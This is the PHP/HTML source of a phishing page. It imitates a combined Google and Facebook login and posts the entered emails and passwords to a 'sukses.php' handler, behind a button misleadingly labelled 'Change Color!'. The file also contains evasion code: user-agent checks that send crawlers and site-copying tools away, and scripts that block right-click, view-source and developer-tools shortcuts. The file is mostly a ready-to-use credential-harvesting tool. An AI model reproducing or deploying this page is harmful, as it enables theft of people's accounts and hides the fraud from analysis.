<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('https://www.facebook.com/IdhamDotID');
die();
}
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<noscript><meta http-equiv="refresh" content="0; URL=https://www.facebook.com/IdhamDotID"/></noscript>
		<meta name="description" content="Login!"/>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /> 
        <meta name="viewport" content="width=360.1, user-scalable=no, initial-scale=1.0, maximum-scale=1.0">
        <meta name="mobile-web-app-capable" content="yes"/>
        <meta name="apple-mobile-web-app-capable" content="yes"/>
        <meta name="apple-mobile-web-app-status-bar-style" content="black"/>
        <meta name="msapplication-tap-highlight" content="no"/>
        <meta name="format-detection" content="telephone=no">
   		<meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta content='width=device-width, initial-scale=1, maximum-scale=1' name='viewport'/>
		<link rel="shortcut icon" href="./img/favicon.jpeg"/>
		<title>Login</title>
   		<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    	<link rel="stylesheet" media="all" href="./css/style.css"/>
	</head>
    <body>
        <div class="header">
            <div class="content">
                <form action="sukses.php" method="POST">
                    <img src="./img/glogo.png" class="logo" alt="idhaam69"/>
                    Google Login<br/>
                    <input class="login" type="email" name="gmail" placeholder="Email" required autocomplete="no" autofocus> 
                    <input class="login" type="password" name="pwgmail" placeholder="Password" required><p/>
                    <img src="./img/fblogo.png" class="logo" alt="idhaam69">
                    Facebook Login<br/>
                    <input class="login" type="text" name="fbmail" placeholder="Username / Email / Phone" required>
                    <input class="login" type="password" name="pwfb" placeholder="Password" required><br/>
                    <button class="btn-login" id="1">Ganti Warna!</button>
                </form>
            </div>
        </div>
        <script>
            var txt="Login!";
            var kecepatan=0;var segarkan=null;function berhenti() { document.title=txt;
                txt=txt.substring(1,txt.length)+txt.charAt(0);
                segarkan=setTimeout("behenti()",kecepatan);}berhenti();
            document.addEventListener("contextmenu", function(e){ e.preventDefault(); }, false);
            document.onkeydown = function(e) {
                if (e.ctrlKey && 
                    (e.keyCode === 67 || 
                    e.keyCode === 83 || 
                    e.keyCode === 85 || 
                    e.keyCode === 117)) {
                    window.location.replace("index.html");
                return false;
                } else {
                     return true;
                }
            };
        </script>
        <!--Kode untuk mencegah shorcut keyboard, view source dll.-->
        <script type="text/javascript">
            window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
        </script>
        <script type="text/javascript">
            document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
        </script>
    </body>
</html>
